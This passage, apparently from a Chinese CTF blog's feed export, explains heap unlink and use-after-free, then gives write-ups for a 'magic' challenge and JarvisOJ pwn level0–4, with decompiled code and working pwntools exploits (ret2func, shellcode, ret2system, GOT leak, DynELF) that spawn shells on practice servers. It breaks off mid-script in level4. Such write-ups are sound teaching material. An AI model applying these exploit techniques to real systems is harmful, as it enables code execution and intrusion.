BK，刚刚提过，FD-&gt;bk就是chunk2，这个指针存储在bin list中，执行后，指针变为P_ptr - 8</li><li>BK-&gt;fd = FD，这里BK-&gt;fd依然是chunk2，执行后，指针变为P_ptr - 12<br>可以看出，这里的第一步结果被第二部的结果覆盖掉，unlink后的实际结果，仅相当于执行了第二步<br>最终bin list中指向chunk2的指针指向了chunk2 - 12的地址处，这个指针一般存在于BSS段，<br>因此可以通过修改指针对任意地址读写。</li></ol><ul><li>UAF</li></ul><p>UAF，即free后使用，free后未将指针置为NULL，造成悬空（也就是野指针），之后想办法将这块内存再次获取回来，写入值，此时的新指针和野指针同时指向这块内存，也就可以利用野指针来操作这块内存的数据，造成任意读写。<br>举个栗子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> stu_id</span><br><span class="line">    <span class="keyword">char</span>* stu_name;</span><br><span class="line">    <span class="keyword">int</span> *()(<span class="keyword">void</span>);</span><br><span class="line">&#125;stu;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></p><p>假设有符合上述结构体的元素stu0，程序此时要free掉stu0，但是忘记将stu0的指针置空，现在我们有一个stu0的指针了。我们需要想办法再次使用stu0这块内存，最简单的办法就是再通过程序申请一个同样大小的块，此时堆管理器会按照管理机制将刚刚释放掉的stu0再度利用，由此我们得到第二个指向stu0的指针，我们控制这个新指针正常对stu_id和stu_name进行赋值，假设stu_name值为AAAA(0x41414141)，打印野指针的stu_name，就会将stu_name的值解引用打印出0x41414141地址处的值，同理如果是通过野指针调用结构体内部函数，会将该地址解引用劫持控制流到任意地址。</p><h3 id="三、pwn题"><a href="#三、pwn题" class="headerlink" title="三、pwn题"></a>三、pwn题</h3><h5 id="1-magic"><a href="#1-magic" class="headerlink" title="1.magic"></a>1.<a href="https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/1" target="_blank" rel="noopener">magic</a></h5><p><a href="https://bamboofox.cs.nctu.edu.tw/uploads/challenge/attachments/1/magic" target="_blank" rel="noopener">题目下载</a></p><p>题目线索给出了两个关键函数源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">    do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过在虚拟机下运行程序，得到如下结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  magic ./magic </span><br><span class="line">Welcome to Magic system!</span><br><span class="line">Give me your name(a-z): aaaa</span><br><span class="line">Your name is aaaa.</span><br><span class="line">Give me something that you want to MAGIC: 1111111111111111</span><br><span class="line">�'��m��:�ǵ�j#</span><br></pre></td></tr></table></figure><p>IDA反编译结果如下：</p><ul><li><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE v4[<span class="number">3</span>]; <span class="comment">// [esp+11h] [ebp-Fh]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to Magic system!"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your name(a-z): "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">10</span> &amp;&amp; read(<span class="number">0</span>, &amp;v4[i], <span class="number">1u</span>) &amp;&amp; v4[i] &gt; <span class="number">96</span> &amp;&amp; v4[i] ; ++i )</span><br><span class="line">      ;</span><br><span class="line">    v4[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your name is %s.\n"</span>, v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me something that you want to MAGIC: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    magic();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>never_use</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">never_use</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"sh -i"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>根据代码可以得出，magic的scanf()处存在栈溢出漏洞，而程序中有一个写好了的never_use()可以调用shell，因此思路在于利用栈溢出劫持eip到never_use()处。<br>为了具体实现，需要事先记下never_use()的地址。在IDA中查看：</p><p><img src="https://i.loli.net/2019/02/18/5c6a8a2a8ab42.png" alt="Please wait while loading image." title="addr"></p><p>这里应该是出题人留了个坑，scanf()在读取\x0D的时候会“吃掉”它，因此这里需要修改目标地址为0x08048613，<br>    target_addr = 0x08048613<br>有了目标地址，再回头来看利用。根据IDA中给出的大小</p><p><img src="https://i.loli.net/2019/02/18/5c6a8eb2c93ba.png" alt="Please wait while loading image." title="stack"></p><p>观察s，距离ebp是44h，即68，加上ebp自身的4字节大小，最后得出payload的格式应该为”[72]+target_addr”，而这里出题人还留了个坑，就是do_magic()，这个函数会在magic()返回之前，将用户的输入与随机数做异或运算，这样原本输入的目标地址会被打乱。为了解决这个问题，需要在payload的地址前插入一个\x00，\x00会使strlen()返回，因此在72个随机字符中只要插入一个\x00，后面的部分就不会被do_magic()改变，目标地址也就保存下来了，最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">target_addr = <span class="number">0x08048613</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">71</span> + <span class="string">'\x00'</span> + p32(target_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'The payload is :'</span> + payload</span><br><span class="line"><span class="comment">#sh = process('./magic')</span></span><br><span class="line">sh = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><code>`</code></p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ-pwn-0~4题解</title>
      <link href="/2019/04/22/JarvisOJ-pwn-0-4/"/>
      <url>/2019/04/22/JarvisOJ-pwn-0-4/</url>
      
        <content type="html"><![CDATA[<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><blockquote><p>这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了</p></blockquote><p><code>main</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1L</span>L, <span class="string">"Hello, World\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>vulnerable_function</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很明显的栈溢出漏洞，buf距离 <code>rbp</code> <code>80h</code>，而<code>read</code>最多可以读<code>200h</code>。<br>同时在程序中还可以发现这个：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -T level0</span><br><span class="line"></span><br><span class="line">level0:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 write</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 system</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 <span class="built_in">read</span></span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 __libc_start_main</span><br><span class="line">0000000000000000  w   D  *UND*0000000000000000              __gmon_start__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -t level0 | grep system</span><br><span class="line">0000000000000000       F *UND*0000000000000000              system@@GLIBC_2.2.5</span><br><span class="line">0000000000400596 g     F .text0000000000000010              callsystem</span><br></pre></td></tr></table></figure><p>可以看到<code>0x400596</code>处有一个<code>callsystem</code>函数，函数反编译如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此构造溢出字符串，使得<code>vulnerable_function</code>返回地址覆盖为<code>callsystem</code>的地址<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./level0')</span></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</span><br><span class="line">addr = p64(<span class="number">0x400596</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + addr</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done</span><br><span class="line">\x96\x05@\x00\x00\x00\x00\x00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;713ca3944e92180e0ef03171981dcd41&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><code>main</code>函数与level0一致，<code>vulnerable_function</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>相比level0，题中没有再给出一个可以直接利用的<code>system</code>函数，因此需要自己构造shellcode，并且劫持控制流返回到shellcode处，<code>vulnerable_function</code>会打印出buf的地址，且程序未开启NX保护，因此只需要将shellcode写入buf将<code>vulnerable_function</code>返回地址覆盖为buf中shellcode的位置（为了方便放在buf的开始部分）即可，exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((<span class="number">0x88</span>+<span class="number">4</span>),<span class="string">'A'</span>)</span><br><span class="line">a = sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">payload  += p32(int(a,base = <span class="number">16</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>vulnerable_function</code>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数中出现了<code>system</code>函数，思路为控制<code>read</code>返回到<code>system</code>函数，并且伪造参数，执行<code>system(&quot;/bin/sh&quot;)</code>，在程序中可以找到这个字符串：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /ctf/pwn/jarvis  strings -a -t x ./level2 | grep bin</span><br><span class="line">  1024 /bin/sh</span><br></pre></td></tr></table></figure></p><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys) + p32(<span class="number">0xaaaaaaaa</span>) + p32(elf.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行结果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><p>不会写exp……</p></blockquote><p><code>vulunerable_function</code> :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同样的溢出点，但是这次没有直接给出可利用的代码，题目提供了<code>libc-2.19.so</code>，因此思路是首先控制<code>read</code>返回到<code>write</code>，控制<code>write</code>调用的参数，使其打印出<code>read</code>的got地址对应的值（即<code>read</code>的绝对地址），并使其返回到<code>vulnerable_function</code>，通过<code>write</code>打印得到的<code>read</code>绝对地址，利用绝对地址和在libc中查询到的<code>read</code>的libc地址计算出偏移，从而计算出system的绝对地址，继而构造<code>system(&#39;/bin/sh&#39;)</code>并执行。</p><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = hex(elf.plt[<span class="string">'write'</span>])</span><br><span class="line">read_got = hex(elf.got[<span class="string">'read'</span>])</span><br><span class="line">vuln_addr = hex(elf.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">args = p32(<span class="number">0x01</span>) + p32(int(read_got, <span class="number">16</span>)) + p32(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) </span><br><span class="line">payload_leak += p32(int(write_plt, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += p32(int(vuln_addr, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += args</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line">re = sh.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> re</span><br><span class="line">read_addr = u32(re)</span><br><span class="line">read_libc = <span class="number">0x000dd3e0</span></span><br><span class="line">offset =  read_addr - read_libc</span><br><span class="line">system_libc = <span class="number">0x00040310</span></span><br><span class="line">exit_libc = <span class="number">0x00033260</span></span><br><span class="line">system_addr = offset + system_libc</span><br><span class="line">exit_addr = offset + exit_libc</span><br><span class="line">binsh_addr = offset + <span class="number">0x162d4c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'payload :'</span> + payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level3/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">�ck�</span><br><span class="line">payload :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x93a�`�`�L�s�</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><blockquote><p>同样不会写exp…</p></blockquote><p>思路与level3大致相同，不过这次没有给出libc，百度了wp才知道需要用到DynELF模块暴力跑出system的地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9880'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到system地址后需要向可执行段写入/bin/sh，因为开启了NX保护，这里选择向bss段写入</span></span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="comment">#不断返回到vuln，每次溢出都调用write，伪造参数，打印地址，利用DynELF得到system绝对地址</span></span><br><span class="line">    payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">0x1</span>) + p32(addr) + p32(<span class="number">0x4</span>)</span><br><span class="line">    sh.sendline(payload_leak)</span><br><span class="line">    leak = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">dyn = DynELF(leak, elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造read参数，溢出返回到read，并向目标地址（bss段）写入/bin/sh</span></span><br><span class="line">payload_write = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0x0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">sh.sendline(payload_write)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>) <span class="comment">#这步结束后，再次返回到vuln</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">useless_addr = <span class="number">0x11111111</span></span><br><span 